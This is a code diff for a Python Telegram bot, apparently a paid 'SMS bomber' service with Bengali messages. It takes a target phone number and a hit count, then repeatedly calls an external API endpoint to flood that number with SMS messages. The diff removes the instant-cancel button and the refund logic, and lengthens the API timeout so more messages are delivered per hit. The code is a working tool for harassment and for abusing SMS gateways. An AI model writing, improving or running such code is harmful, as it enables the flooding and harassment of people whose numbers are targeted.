@@ -205,7 +205,6 @@ def check_vip_status(tg_user):
     return u.get("is_vip", False)
 
 temp_data = {}
-active_bombing_tasks = {} # Dedicated thread-safe tracker for active bombing
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -335,21 +334,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await main_menu(update, context)
         else:
             await send_join_prompt(update, unjoined, is_error=True)
-
-    # 🛑 INSTANT CANCEL BUTTON HANDLER
-    elif query.data.startswith('cancel_bombing_'):
-        target_uid = int(query.data.split('_')[2])
-        if user_id == target_uid or is_admin(user_id):
-            if target_uid in active_bombing_tasks:
-                active_bombing_tasks[target_uid]['cancel'] = True
-            if target_uid in temp_data:
-                temp_data[target_uid]['cancel'] = True
-                
-            try: await query.answer("🔴 বোম্বিং সাথে সাথে বাতিল করা হয়েছে!", show_alert=True)
-            except Exception: pass
-        else:
-            try: await query.answer("❌ আপনি এই বোম্বিং বাতিল করতে পারবেন না!", show_alert=True)
-            except Exception: pass
 
 # ===================== ADMIN COMMANDS =====================
 async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -764,7 +748,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ নম্বর সেট: <code>{num}</code>\n\n💥 কত বার (হিট) বোম্বিং করবেন?\n{limit_info}", parse_mode="HTML", reply_markup=get_back_keyboard())
         return
 
-    # ===== BOMBING LOOP WITH FAST CANCEL & EXACT bot3.py SMS COUNTS =====
+    # ===== BOMBING LOOP (EXACT bot3.py SYSTEM WITH NO CANCEL BUTTON & FULL TIMEOUT) =====
     elif step == 'awaiting_amount':
         try:
             amount = int(message)
@@ -781,40 +765,33 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             number = temp_data[user_id]['number']
             
-            # Initial Deduction
+            # Initial Points Deduction
             if not is_vip:
                 if users_col is not None:
                     users_col.update_one({"user_id": user_id}, {"$inc": {"points": -total_cost}}, upsert=True)
                 
-            # Initialize Active Task State
-            active_bombing_tasks[user_id] = {'cancel': False}
-            
             if users_col is not None:
                 users_col.update_one({"user_id": user_id}, {"$set": {"last_bombing": datetime.now()}}, upsert=True)
             
-            cancel_kbd = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 CANCEL BOMBING", callback_data=f"cancel_bombing_{user_id}")]])
-            msg = await update.message.reply_text(f"💣 <b>BOMBING IN PROGRESS...</b>\n\n📱 টার্গেট: <code>{number}</code>\n💥 হিট: {amount} বার", parse_mode="HTML", reply_markup=cancel_kbd)
+            # Processing initial message (Exact bot 3.py style)
+            msg = await update.message.reply_text(
+                f"⏳ <b>বোম্বিং শুরু হচ্ছে...</b>\n\n"
+                f"📱 টার্গেট: <code>{number}</code>\n"
+                f"💥 হিট: {amount} বার\n"
+                f"⏰ দয়া করে অপেক্ষা করুন...",
+                parse_mode="HTML"
+            )
             
             total_sent_count = 0
             total_failed_count = 0
-            completed_hits = 0
             last_response = {}
             st = get_settings()
             current_api = st.get('api_url', "https://masterapi-sable.vercel.app/send?phone=")
             
-            spinners = ["⏳", "⌛", "⚡", "💥"]
-            
             for i in range(amount):
-                # Yield to Event Loop so Telegram Button Clicks are processed instantly!
-                await asyncio.sleep(0.05)
-                
-                # 🎯 Pre-Hit Cancel Check
-                if active_bombing_tasks.get(user_id, {}).get('cancel', False):
-                    break
-
                 try:
-                    # 💥 Fast Non-blocking API Call
-                    api_response = await asyncio.to_thread(requests.get, f"{current_api}{number}", timeout=4)
+                    # 💥 Full 30-second timeout (Allows Master API Gateway to complete all internal SMS)
+                    api_response = await asyncio.to_thread(requests.get, f"{current_api}{number}", timeout=30)
                     
                     # 💥 EXACT SMS Counting Logic From bot 3.py
                     if api_response.status_code == 200:
@@ -838,112 +815,64 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
                 except Exception as e:
                     total_failed_count += 1
+                    print(f"Error hit {i+1}: {e}")
                 
-                completed_hits += 1
-                
-                await asyncio.sleep(0.05)
-                
-                # 🎯 Post-Hit Cancel Check
-                if active_bombing_tasks.get(user_id, {}).get('cancel', False):
-                    break
-
-                percent = int((completed_hits / amount) * 100)
-                filled = int(10 * completed_hits // amount)
-                bar = '▰' * filled + '▱' * (10 - filled)
-                sp = spinners[i % len(spinners)]
-                
+                # Live progress update (Exact bot 3.py style)
                 try:
                     await msg.edit_text(
-                        f"💣 <b>BOMBING IN PROGRESS...</b> {sp}\n\n"
+                        f"⏳ <b>বোম্বিং চলছে...</b>\n\n"
                         f"📱 টার্গেট: <code>{number}</code>\n"
-                        f"📊 প্রগ্রেস: <code>[{bar}]</code> <b>{percent}%</b> (হিট: {completed_hits}/{amount})\n\n"
                         f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
-                        f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>",
-                        parse_mode="HTML",
-                        reply_markup=cancel_kbd
+                        f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>\n"
+                        f"📊 প্রগ্রেস: <b>{i+1}/{amount} হিট</b>",
+                        parse_mode="HTML"
                     )
-                except Exception: pass
+                except Exception:
+                    pass
                 
-                # Short interruptible sleep yielding control to button events
-                for _ in range(5):
-                    if active_bombing_tasks.get(user_id, {}).get('cancel', False):
-                        break
-                    await asyncio.sleep(0.1)
+                await asyncio.sleep(1)
 
-            # Yield control to capture any last-millisecond button clicks
-            await asyncio.sleep(0.1)
+            # Final Calculations & Database Sync
+            total_requests = total_sent_count + total_failed_count
             
-            is_cancelled = active_bombing_tasks.get(user_id, {}).get('cancel', False)
-            if user_id in active_bombing_tasks:
-                del active_bombing_tasks[user_id]
-
-            # 🛑 Handle Cancellation Refund Execution
-            if is_cancelled:
-                unexecuted_hits = amount - completed_hits
-                refund_points = 0 if is_vip else unexecuted_hits * POINT_PER_HIT
-                
-                if refund_points > 0 and users_col is not None:
-                    users_col.update_one({"user_id": user_id}, {"$inc": {"points": refund_points}}, upsert=True)
-                
-                fresh_u = get_user_data(user)
-                balance_info = "VIP Access" if is_vip else f"{fresh_u.get('points', 0)} Points"
-                
-                total_reqs = total_sent_count + total_failed_count
-                success_rate = round((total_sent_count / total_reqs) * 100, 2) if total_reqs > 0 else 0.0
-
-                await msg.edit_text(
-                    f"🛑 <b>বোম্বিং সাথে সাথে বাতিল করা হয়েছে!</b>\n\n"
-                    f"📱 টার্গেট: <code>{number}</code>\n"
-                    f"💥 সম্পন্ন হিট: <b>{completed_hits} / {amount}</b>\n"
-                    f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
-                    f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>\n"
-                    f"📊 সফলতার হার: <b>{success_rate}%</b>\n\n"
-                    f"💵 কাটা হয়েছিল: <b>{total_cost} Pts</b>\n"
-                    f"🎁 ফেরত দেওয়া হয়েছে: <b>+{refund_points} Points</b>\n"
-                    f"💳 বর্তমান ব্যালেন্স: <b>{balance_info}</b>",
-                    parse_mode="HTML"
+            if users_col is not None:
+                users_col.update_one(
+                    {"user_id": user_id},
+                    {"$inc": {
+                        "total_bombing": 1,
+                        "total_success": total_sent_count,
+                        "total_failed": total_failed_count,
+                        "total_requests": total_requests
+                    }},
+                    upsert=True
                 )
             
-            # Normal completion
-            else:
-                total_requests = total_sent_count + total_failed_count
-                
-                if users_col is not None:
-                    users_col.update_one(
-                        {"user_id": user_id},
-                        {"$inc": {
-                            "total_bombing": 1,
-                            "total_success": total_sent_count,
-                            "total_failed": total_failed_count,
-                            "total_requests": total_requests
-                        }},
-                        upsert=True
-                    )
-                
-                fresh_u = get_user_data(user)
-                creator = last_response.get('creator', 'BCZ Team')
-                service = last_response.get('service', 'Master API Gateway')
-                success_rate = round((total_sent_count / total_requests) * 100, 2) if total_requests > 0 else 0
-                
-                cost_text = "FREE (VIP)" if is_vip else f"{total_cost} Points"
-                balance_text = "VIP Access" if is_vip else f"{fresh_u.get('points', 0)} Points"
-                
-                result_message = (
-                    f"✅ <b>বোম্বিং সফলভাবে সম্পন্ন!</b> ✅\n\n"
-                    f"📱 টার্গেট: <code>{number}</code>\n"
-                    f"💥 হিট সম্পন্ন: <b>{amount} / {amount} বার</b>\n"
-                    f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
-                    f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>\n"
-                    f"📊 সফলতার হার: <b>{success_rate}%</b>\n"
-                    f"📤 মোট রিকোয়েস্ট: <b>{total_requests}</b>\n"
-                    f"💰 খরচ: <b>{cost_text}</b>\n"
-                    f"💳 অবশিষ্ট ব্যালেন্স: <b>{balance_text}</b>\n\n"
-                    f"🛠 সার্ভিস: {service}\n"
-                    f"👨‍💻 Creator: {creator}"
-                )
-                await msg.edit_text(result_message, parse_mode="HTML")
+            fresh_u = get_user_data(user)
+            creator = last_response.get('creator', 'BCZ Team')
+            service = last_response.get('service', 'Master API Gateway')
+            success_rate = round((total_sent_count / total_requests) * 100, 2) if total_requests > 0 else 0
+            
+            cost_text = "FREE (VIP)" if is_vip else f"{total_cost} Points"
+            balance_text = "VIP Access" if is_vip else f"{fresh_u.get('points', 0)} Points"
+            
+            # 🎯 Final Result Message (Exact layout as bot 3.py Image 2)
+            result_message = (
+                f"✅ <b>বোম্বিং সফলভাবে সম্পন্ন!</b> ✅\n\n"
+                f"📱 টার্গেট: <code>{number}</code>\n"
+                f"💥 হিট: <b>{amount} বার</b>\n"
+                f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
+                f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>\n"
+                f"📊 সফলতার হার: <b>{success_rate}%</b>\n"
+                f"📤 মোট রিকোয়েস্ট: <b>{total_requests}</b>\n"
+                f"💰 খরচ: <b>{cost_text}</b>\n"
+                f"💳 অবশিষ্ট ব্যালেন্স: <b>{balance_text}</b>\n\n"
+                f"🛠 সার্ভিস: <b>{service}</b>\n"
+                f"👨‍💻 Creator: <b>{creator}</b>\n\n"
+                f"📌 আপনার মোট বোম্বিং সেশন: <b>{fresh_u.get('total_bombing', 1)}</b>"
+            )
+            await msg.edit_text(result_message, parse_mode="HTML")
 
-            await update.message.reply_text("🏠 মেইন মেনু", reply_markup=get_main_keyboard(user_id))
+            await update.message.reply_text("🏠 মেইন মেনুতে ফিরে আসুন", reply_markup=get_main_keyboard(user_id))
             if user_id in temp_data: del temp_data[user_id]
                 
         except ValueError: await update.message.reply_text("❌ ভুল ইনপুট! দয়া করে সংখ্যা দিন।", reply_markup=get_back_keyboard())
@@ -972,7 +901,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     
     print("="*50)
-    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH INSTANT CANCEL & FAST RESPONSE!")
+    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH EXACT bot3.py ACCURACY!")
     print("="*50)
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
